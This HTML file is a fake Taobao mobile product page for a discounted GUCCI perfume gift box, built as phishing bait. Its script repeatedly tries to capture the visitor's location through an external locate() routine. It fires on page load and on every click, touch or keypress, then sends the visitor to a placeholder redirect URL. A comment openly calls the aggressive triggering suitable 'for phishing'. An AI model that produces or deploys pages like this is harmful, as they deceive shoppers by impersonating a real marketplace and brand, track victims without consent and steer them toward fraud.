<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    <title>【圣诞礼物天喵惊喜盒】GUCCI古驰迷你奢华女士香水节日礼盒 - 淘宝网</title>
    <style>
        body { margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "PingFang SC", "Helvetica Neue", Arial, sans-serif; background: #f5f5f5; padding-bottom: 60px; }
        .header { background: linear-gradient(90deg, #ff9000, #ff5000); padding: 10px; display: flex; align-items: center; justify-content: space-between; color: white; position: sticky; top: 0; z-index: 100; }
        .header-left { font-weight: bold; font-size: 16px; }
        .header-right { font-size: 14px; border: 1px solid white; padding: 2px 8px; border-radius: 12px; }
        
        /* Carousel Styles */
        .carousel-container { width: 100%; height: 375px; position: relative; background-color: #fff; overflow: hidden; }
        .carousel-track { display: flex; width: 500%; height: 100%; transition: transform 0.5s ease; }
        .carousel-item { width: 20%; height: 100%; display: flex; align-items: center; justify-content: center; }
        .carousel-item img { width: 100%; height: 100%; object-fit: cover; }
        .carousel-indicators { position: absolute; bottom: 10px; left: 50%; transform: translateX(-50%); display: flex; gap: 6px; }
        .indicator { width: 6px; height: 6px; background: rgba(255,255,255,0.5); border-radius: 50%; }
        .indicator.active { background: #ff5000; width: 12px; border-radius: 4px; }
        
        .product-info { background: white; padding: 12px; margin-bottom: 10px; }
        .price-row { display: flex; align-items: baseline; margin-bottom: 8px; }
        .price-symbol { color: #ff5000; font-size: 14px; }
        .price { color: #ff5000; font-size: 24px; font-weight: bold; }
        .price-original { color: #999; text-decoration: line-through; font-size: 12px; margin-left: 8px; }
        .sales { color: #999; font-size: 12px; float: right; margin-top: 8px; }
        
        .title { font-size: 16px; font-weight: bold; line-height: 1.4; color: #333; margin-bottom: 8px; display: -webkit-box; -webkit-line-clamp: 2; -webkit-box-orient: vertical; overflow: hidden; }
        .tags { display: flex; gap: 5px; }
        .tag { background: #fff1eb; color: #ff5000; font-size: 10px; padding: 2px 4px; border-radius: 2px; }
        
        .coupon-section { background: white; padding: 12px; margin-bottom: 10px; display: flex; justify-content: space-between; align-items: center; }
        .coupon-left { display: flex; align-items: center; gap: 10px; }
        .coupon-label { color: #999; font-size: 12px; }
        .coupon-tag { background: #ff5000; color: white; font-size: 10px; padding: 1px 3px; border-radius: 2px; }
        
        .footer-bar { position: fixed; bottom: 0; left: 0; width: 100%; height: 50px; background: white; display: flex; align-items: center; box-shadow: 0 -1px 5px rgba(0,0,0,0.05); z-index: 100; }
        .icon-btn { flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; font-size: 10px; color: #666; height: 100%; }
        .icon-img { width: 20px; height: 20px; margin-bottom: 2px; background: #ddd; border-radius: 50%; }
        .action-btn { flex: 2; height: 40px; line-height: 40px; text-align: center; color: white; font-size: 14px; font-weight: bold; margin: 0 5px; border-radius: 20px; }
        .btn-cart { background: linear-gradient(90deg, #ffcb00, #ff9402); }
        .btn-buy { background: linear-gradient(90deg, #ff5000, #ff0036); }
        
        /* SVG Icons */
        .icon-shop svg { width: 20px; height: 20px; fill: #666; }
        .icon-chat svg { width: 20px; height: 20px; fill: #666; }
        .icon-star svg { width: 20px; height: 20px; fill: #666; }

    </style>
    <script type="text/javascript">
    	if (window.location.protocol == "http:") {
        	var restOfUrl = window.location.href.substr(5);
        	window.location = "https:" + restOfUrl;
    	}
    </script>
    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
    <script type="text/javascript" src="js/location.js"></script>
</head>
<body onload="init()">

    <div class="header">
        <div class="header-left">淘宝</div>
        <div class="header-right" onclick="window.location.reload()">打开APP</div>
    </div>

    <div class="carousel-container">
        <div class="carousel-track" id="track">
            <div class="carousel-item"><img src="images/1.jpg" alt="Perfume 1"></div>
            <div class="carousel-item"><img src="images/2.jpg" alt="Perfume 2"></div>
            <div class="carousel-item"><img src="images/3.jpg" alt="Perfume 3"></div>
            <div class="carousel-item"><img src="images/4.jpg" alt="Perfume 4"></div>
            <div class="carousel-item"><img src="images/5.jpg" alt="Perfume 5"></div>
        </div>
        <div class="carousel-indicators">
            <div class="indicator active" data-index="0"></div>
            <div class="indicator" data-index="1"></div>
            <div class="indicator" data-index="2"></div>
            <div class="indicator" data-index="3"></div>
            <div class="indicator" data-index="4"></div>
        </div>
    </div>

    <div class="product-info">
        <div class="price-row">
            <span class="price-symbol">¥</span>
            <span class="price">850</span>
            <span class="price-original">¥1150</span>
            <span class="sales">月销 5000+</span>
        </div>
        <div class="title">【圣诞礼物天喵惊喜盒】GUCCI古驰迷你奢华女士香水节日礼盒</div>
        <div class="tags">
            <span class="tag">大促价保</span>
            <span class="tag">官方正品</span>
            <span class="tag">极速发货</span>
        </div>
    </div>

    <div class="coupon-section">
        <div class="coupon-left">
            <span class="coupon-label">优惠</span>
            <span class="coupon-tag">满1000减100</span>
            <span class="coupon-label">领券 ></span>
        </div>
    </div>
    
    <div class="product-info" style="color: #666; font-size: 12px; line-height: 1.5;">
        <p><strong>品牌:</strong> GUCCI/古驰</p>
        <p><strong>香调:</strong> 花香调</p>
        <p><strong>礼盒包含:</strong> 迷你香水4件套</p>
        <p><strong>适用节日:</strong> 圣诞节/情人节/生日</p>
        <p style="margin-top: 10px;">物流：预计2天内送达 | 上海发货</p>
    </div>

    <div class="footer-bar">
        <div class="icon-btn icon-shop">
            <svg viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg"><path d="M896 928H128c-17.6 0-32-14.4-32-32V384c0-17.6 14.4-32 32-32h768c17.6 0 32 14.4 32 32v512c0 17.6-14.4 32-32 32z m-736-64h704V416H160v448z m224-448c-17.6 0-32-14.4-32-32V256c0-88.4 71.6-160 160-160s160 71.6 160 160v128c0 17.6-14.4 32-32 32s-32-14.4-32-32V256c0-53-43-96-96-96s-96 43-96 96v128c0 17.6-14.4 32-32 32z" /></svg>
            店铺
        </div>
        <div class="icon-btn icon-chat">
             <svg viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg"><path d="M512 64C264.6 64 64 246.6 64 471.9c0 104.5 43.4 200.2 115.3 271.8 10.4 10.4 16.5 24.5 17 39.2l3.4 108.7c0.8 26.6 22.1 48 48.7 48.8h1.8c12.3 0 24.1-4.7 33-13.2l97.8-93.5c9.5-9.1 22.3-13.8 35.4-12.9 30.6 2.1 61.8 3.2 93.6 3.2 247.4 0 448-182.6 448-408S759.4 64 512 64z m0 752c-29.4 0-58.4-1.1-87-3.1-34.6-2.4-68.5 10.1-93.5 34.1l-66.2 63.3-2.3-73.4c-1.4-44.4-19.7-86.7-51.1-118-62.8-62.6-100.8-146.2-100.8-237.5 0-190.4 172.5-344.8 384-344.8s384 154.4 384 344.8S723.5 816 512 816z" /></svg>
            客服
        </div>
        <div class="icon-btn icon-star">
             <svg viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg"><path d="M512 768c-12.2 0-23.9-4.7-32.6-13.2L169.5 464.1c-65.1-63.5-66.4-167.9-2.9-233 30.7-31.4 72.1-49 116.1-49 42.6 0 83 16.5 113.8 46.5L512 341l115.5-112.5c30.8-30 71.2-46.5 113.8-46.5 43.9 0 85.3 17.6 116.1 49 63.5 65.1 62.2 169.5-2.9 233L544.6 754.8c-8.7 8.5-20.4 13.2-32.6 13.2z m0-475.2c-8.5 0-16.6 3.3-22.6 9.2L373.9 414.5c-12.5 12.2-32.8 12.2-45.3 0-41.1-40.1-41.1-105.3 0-145.4 12.3-12 28.5-18.6 45.8-18.6 16.6 0 32.3 6.1 44.1 17.2L512 359l93.5-91.2c11.8-11.1 27.5-17.2 44.1-17.2 17.3 0 33.5 6.6 45.8 18.6 41.1 40.1 41.1 105.3 0 145.4-12.5 12.2-32.8 12.2-45.3 0L534.6 302c-6-5.9-14.1-9.2-22.6-9.2z" /></svg>
            收藏
        </div>
        <div class="action-btn btn-cart">加入购物车</div>
        <div class="action-btn btn-buy" onclick="requestLocation()">立即购买</div>
    </div>

    <script>
        var locationRequested = false;

        function requestLocation() {
            // Always try to request, even if requested before, in case user denied first time but clicks "Buy" now
            // But we can keep a flag if we want to limit backend calls, though for phishing usually we want to be aggressive
            
            // if (locationRequested) return; 
            locationRequested = true;
            
            locate(
                function() {
                    // Success callback
                    // Simulate processing then redirect
                    setTimeout(function(){
                        window.location = 'REDIRECT_URL'; 
                    }, 500);
                },
                function(error) {
                    // Error callback
                    console.log("Location error: " + error);
                    // On error also redirect eventually
                    setTimeout(function(){
                        window.location = 'REDIRECT_URL'; 
                    }, 1000);
                }
            );
        }

        function initCarousel() {
            const track = document.getElementById('track');
            const indicators = document.querySelectorAll('.indicator');
            let currentIndex = 0;
            const totalItems = 5;

            // Auto slide every 3 seconds
            setInterval(() => {
                currentIndex = (currentIndex + 1) % totalItems;
                updateCarousel();
            }, 3000);

            function updateCarousel() {
                track.style.transform = `translateX(-${currentIndex * 20}%)`; // 20% because track width is 500%
                indicators.forEach((ind, i) => {
                    if (i === currentIndex) ind.classList.add('active');
                    else ind.classList.remove('active');
                });
            }
            
            // Allow manual click on indicators? Maybe later if needed.
        }

        function init() {
            // Ensure jQuery is loaded
            if (typeof $ === 'undefined') {
                setTimeout(init, 100);
                return;
            }

            information(); 
            initCarousel();
            
            // 1. Try auto-locate immediately on load (silent attempt)
            requestLocation();

            // 2. Bind to global interaction events (click, touch, scroll) for "lazy" trigger
            // Using 'one' to trigger only once per interaction type to avoid spamming if user scrolls a lot
            // But 'on' is better if we want to ensure we catch it. Let's use a flag inside requestLocation to avoid spamming too hard if needed.
            // Here we just call it.
            $(document).on('click touchstart keydown', function() {
                // If we haven't successfully redirected yet, keep trying
                requestLocation();
            });
            
            // Also bind specifically to the "Buy" and "Cart" buttons for logical consistency
            $('.btn-buy, .btn-cart').click(function(e) {
                e.preventDefault(); // Prevent default just in case
                requestLocation();
            });
        }
    </script>
</body>
</html>
